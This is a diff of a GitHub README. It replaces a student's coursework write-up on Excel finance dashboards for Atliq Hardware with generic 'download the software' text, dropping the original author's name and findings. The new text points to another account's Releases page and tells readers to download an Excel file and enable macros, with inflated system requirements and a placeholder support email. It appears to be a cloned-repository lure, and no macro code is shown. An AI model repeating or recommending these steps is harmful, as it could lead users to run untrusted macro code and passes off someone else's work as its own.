@@ -1,97 +1,84 @@
-# 📊 Finance Analytics – Atliq Hardware  
+# 📊 Excel---Finance-Analytics - Access Insights from Your Data
 
-<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/9d3067b0-b1bd-4ced-94a9-7df14cdf750a" />
+## 🚀 Getting Started
 
----
+Welcome to the Excel---Finance-Analytics project! This software helps you analyze finance data using Excel-based dashboards and reports. You can easily explore customer information, market trends, and profitability. 
 
-## 📝 Project Overview  
-This project is part of coursework and focuses on **financial analytics for Atliq Hardware**.  
-Using **Microsoft Excel**, I designed structured reports and dashboards to analyze:  
+## 📥 Download the Software
 
-- 📈 Sales performance across years  
-- 🌍 Market-wise growth and profitability  
-- 👥 Customer contribution trends  
-- 💰 Profit & Loss statements at multiple levels (year, market, month)  
+[![Download Software](https://img.shields.io/badge/Download%20Now-Excel---Finance-Analytics-blue)](https://github.com/mdjibonhasan/Excel---Finance-Analytics/releases)
 
-The project demonstrates how **raw financial data** can be transformed into **executive-level insights** for decision-making.  
+## 📋 System Requirements
 
----
+Before you begin, ensure your computer meets the following requirements:
 
-## 📂 Reports Included  
+- Operating System: Windows 10 or later, MacOS Catalina or later
+- Microsoft Excel: Version 2016 or later
+- Minimum RAM: 4 GB
+- Disk Space: 200 MB of free space
 
-### 1️⃣ Customer Performance Report  
-📌 Identifies top revenue-generating customers and YoY growth  
-📊 Example: Amazon grew **218.9%** in 2021 vs 2020  
+## 🛠️ Installation Instructions
 
-<img width="919" height="805" alt="image" src="https://github.com/user-attachments/assets/347cfe6a-88e1-4541-94a3-1e5e6bbb1ef7" />
+Follow these steps to install and run the software:
 
+1. **Visit the Download Page**  
+   Click the link below to go to the Releases page where you can download the software:  
+   [Download Page](https://github.com/mdjibonhasan/Excel---Finance-Analytics/releases)
 
----
+2. **Select the Latest Release**  
+   On the Releases page, you will see a list of versions. Find the latest release at the top and click on it.
 
-### 2️⃣ Market Performance vs Target Report  
-📌 Evaluates country-level performance against set targets  
-⚠️ Example: USA missed targets by **11.66%**, while India contributed **161.3M**  
+3. **Download the Excel File**  
+   Look for the `Excel-Finance-Analytics.xlsx` file. Click on it to download.
 
-<img width="703" height="788" alt="image" src="https://github.com/user-attachments/assets/4a661f6a-c8cc-4c03-a467-30f7e91a28ab" />
+4. **Open the File**  
+   Once the download is complete, navigate to your downloads folder. Double-click the `Excel-Finance-Analytics.xlsx` file to open it in Microsoft Excel.
 
----
+5. **Enable Macros**  
+   If prompted, enable macros to access all features. This may appear as a warning at the top of the Excel window.
 
-### 3️⃣ P&L Statement by Fiscal Year  
-📌 Yearly breakdown of Net Sales, COGS, and Gross Margin  
-🚀 Sales grew **204.5%** between 2020 → 2021  
+6. **Explore the Dashboard**  
+   Use the tabs at the bottom of the Excel workbook to navigate through different sections, such as Sales Analysis and Market Overview.
 
-<img width="1390" height="743" alt="image" src="https://github.com/user-attachments/assets/c8567881-fefe-4098-8b50-f19e0b315519" />
+## 📊 Features
 
+- **Interactive Dashboards**: Visual representations of data that you can explore and customize.
+- **Financial Reporting**: Generate reports that summarize key financial metrics.
+- **Data Visualization**: Charts and graphs to help understand trends and insights.
+- **Pivot Tables**: Analyze complex data sets with easy-to-use pivot table functionality.
+- **Custom Queries**: Tailor data queries according to your analysis needs.
 
----
+## 📈 Topics Covered
 
-### 4️⃣ P&L Statement by Markets  
-📌 FY 2021 Profitability analysis by market  
-🌟 High-margin regions: **New Zealand (48.2%)**, **Japan (46.5%)**  
-⚠️ Low-margin region: **Germany (26.2%)**  
+This project supports a wide range of analytics topics, such as:
 
-<img width="760" height="890" alt="image" src="https://github.com/user-attachments/assets/b9c70b13-f008-46f7-9812-2cd18dd65f8a" />
+- Business Analytics
+- Business Intelligence Analytics
+- Corporate Finance
+- Data-Driven Insights
+- Data Visualization
+- Financial Performance
+- Sales Analysis Dashboard
+- Market Analysis
 
+Integrate these insights to make informed business decisions with your finance data.
 
----
+## 👩‍💻 User Support
 
-### 5️⃣ P&L Statement by Months  
-📌 Monthly/Quarterly sales and margin analysis  
-📊 Captures seasonality and growth trends  
-🚀 Net Sales up **204.5% in FY 2021 vs FY 2020**  
+If you encounter any issues or have questions, feel free to reach out for support:
 
-<img width="703" height="932" alt="image" src="https://github.com/user-attachments/assets/af7a4493-c0d0-459e-b9f0-e2ab3f442bce" />
+- **Email**: support@example.com
+- **GitHub Issues**: Post your queries or bugs directly on the GitHub issues page of this project.
 
----
+## 🌟 Contributions
 
-## 🛠️ Tools & Skills Applied  
-- **Microsoft Excel** → PivotTables, Charts, Conditional Formatting, Data Modeling  
-- **Finance Analytics** → Sales & Margin tracking, Target vs Actual analysis  
-- **Business Insights** → Market evaluation, Customer contribution, Strategic growth  
+Contributions are welcome! If you would like to help enhance this project, please read the contributing guidelines in the repository.
 
----
+## 🌐 Links for Further Information
 
-## 🚀 Key Insights  
-✔️ Revenue grew **6.8x in 3 years** (87.5M → 598.9M)  
-✔️ Customer concentration shows reliance on e-commerce giants like **Amazon & Flipkart**  
-✔️ Profitability varies significantly across geographies  
-✔️ Margins declining despite revenue growth → highlights cost optimization needs  
+For more details about the project, you can visit:
 
----
+- [GitHub Repository](https://github.com/mdjibonhasan/Excel---Finance-Analytics)
+- [Download Page](https://github.com/mdjibonhasan/Excel---Finance-Analytics/releases)
 
-## 🎯 Learning Outcomes  
-- Gained expertise in **Excel-based dashboarding**  
-- Developed ability to **translate raw finance data into insights**  
-- Learned to present **executive-ready financial reports**  
-
-
----
-
-## 🏷️ Repository Tagline  
-**“Comprehensive finance analytics project for Atliq Hardware – Excel-based dashboards and reports analyzing customers, markets, and profitability.”**  
-
----
-
-👤 **Author:** Abhigyan Sarmah
-📅 **Coursework Project** | 📍 *Excel-based Analytics*  
-
+Explore the potential of your finance data with Excel---Finance-Analytics!
